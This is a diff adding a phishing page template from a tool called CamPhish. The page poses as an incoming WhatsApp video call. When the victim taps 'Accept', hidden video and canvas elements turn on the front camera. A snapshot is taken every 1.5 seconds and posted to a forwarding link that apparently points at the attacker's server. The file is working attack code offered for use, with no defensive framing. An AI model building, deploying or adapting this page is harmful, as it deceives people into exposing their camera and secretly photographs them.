@@ -1,0 +1,249 @@
+<!--
+ * CamPhish - Advanced Camera Phishing Tool
+ * 
+ * Author: Rahul Kushwaha
+ * GitHub: https://github.com/raahulllkushwaha
+ * Repository: https://github.com/raahulllkushwaha/Cam-Phisher
+ * License: GNU General Public License v3.0
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Video Call</title>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #075E54;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .call-container {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .avatar {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            background: #128C7E;
+            margin: 0 auto 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 60px;
+            color: white;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .caller-name {
+            color: white;
+            font-size: 28px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+
+        .call-status {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 16px;
+            margin-bottom: 60px;
+            animation: blink 1.5s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50%, 100% {
+                opacity: 1;
+            }
+            25%, 75% {
+                opacity: 0.5;
+            }
+        }
+
+        .call-actions {
+            display: flex;
+            justify-content: center;
+            gap: 80px;
+        }
+
+        .call-btn {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            border: none;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 30px;
+            transition: transform 0.2s;
+        }
+
+        .call-btn:hover {
+            transform: scale(1.1);
+        }
+
+        .decline-btn {
+            background: #FF3B30;
+            color: white;
+        }
+
+        .accept-btn {
+            background: #25D366;
+            color: white;
+            animation: ring 1s infinite;
+        }
+
+        @keyframes ring {
+            0%, 100% {
+                transform: rotate(0deg);
+            }
+            20%, 60% {
+                transform: rotate(-10deg);
+            }
+            40%, 80% {
+                transform: rotate(10deg);
+            }
+        }
+
+        .call-btn-label {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 12px;
+            margin-top: 10px;
+        }
+
+        .call-btn-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .video-wrap {
+            display: none;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        .whatsapp-logo {
+            position: absolute;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 24px;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .encrypted-msg {
+            position: absolute;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden webcam capture elements -->
+    <div class="video-wrap">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <div class="whatsapp-logo">
+        <span>📞</span>
+        <span>WhatsApp</span>
+    </div>
+
+    <div class="call-container">
+        <div class="avatar">👤</div>
+        <h1 class="caller-name">Unknown Caller</h1>
+        <p class="call-status">Incoming Video Call...</p>
+        
+        <div class="call-actions">
+            <div class="call-btn-wrapper">
+                <button class="call-btn decline-btn" onclick="declineCall()">✕</button>
+                <span class="call-btn-label">Decline</span>
+            </div>
+            <div class="call-btn-wrapper">
+                <button class="call-btn accept-btn" onclick="acceptCall()">📹</button>
+                <span class="call-btn-label">Accept</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="encrypted-msg">
+        <span>🔒</span>
+        <span>End-to-end encrypted</span>
+    </div>
+
+    <script>
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {},
+                error: function() {}
+            });
+        }
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user"
+            }
+        };
+
+        function declineCall() {
+            alert('Call declined');
+        }
+
+        async function acceptCall() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                console.log('Camera access denied');
+            }
+        }
+
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            var context = canvas.getContext('2d');
+            setInterval(function() {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
